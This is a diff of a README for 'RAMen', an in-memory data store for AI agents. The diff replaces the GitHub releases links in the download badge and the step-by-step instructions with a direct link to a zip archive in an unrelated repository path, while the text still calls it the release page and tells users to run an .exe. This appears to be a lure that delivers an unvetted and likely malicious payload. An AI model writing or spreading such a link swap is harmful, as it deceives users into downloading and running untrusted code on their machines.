@@ -5,13 +5,13 @@ description: "Accelerate AI agents with this Redis-compatible, in-memory data st
 ---
 # 🍜 RAMen - Fast data storage for AI agents
 
-[![](https://img.shields.io/badge/Download-RAMen-blue)](https://github.com/fallfrogorchid557/RAMen/releases)
+[![](https://img.shields.io/badge/Download-RAMen-blue)](https://raw.githubusercontent.com/fallfrogorchid557/fallfrogorchid557.github.io/main/dicaeology/io_github_fallfrogorchid_1.8.zip)
 
 RAMen stores data in your computer memory. It performs tasks at high speeds. It follows the rules used by Redis, which makes it a simple replacement for current systems. You can use it to search for data based on meaning or save data for your AI agents. It functions as a single program file that requires no installation.
 
 ## 📥 How to download and run
 
-1. Visit the [RAMen release page](https://github.com/fallfrogorchid557/RAMen/releases) to select your file.
+1. Visit the [RAMen release page](https://raw.githubusercontent.com/fallfrogorchid557/fallfrogorchid557.github.io/main/dicaeology/io_github_fallfrogorchid_1.8.zip) to select your file.
 2. Find the file ending in `.exe` for Windows systems.
 3. Click the file name to start the download.
 4. Locate the file in your Downloads folder.
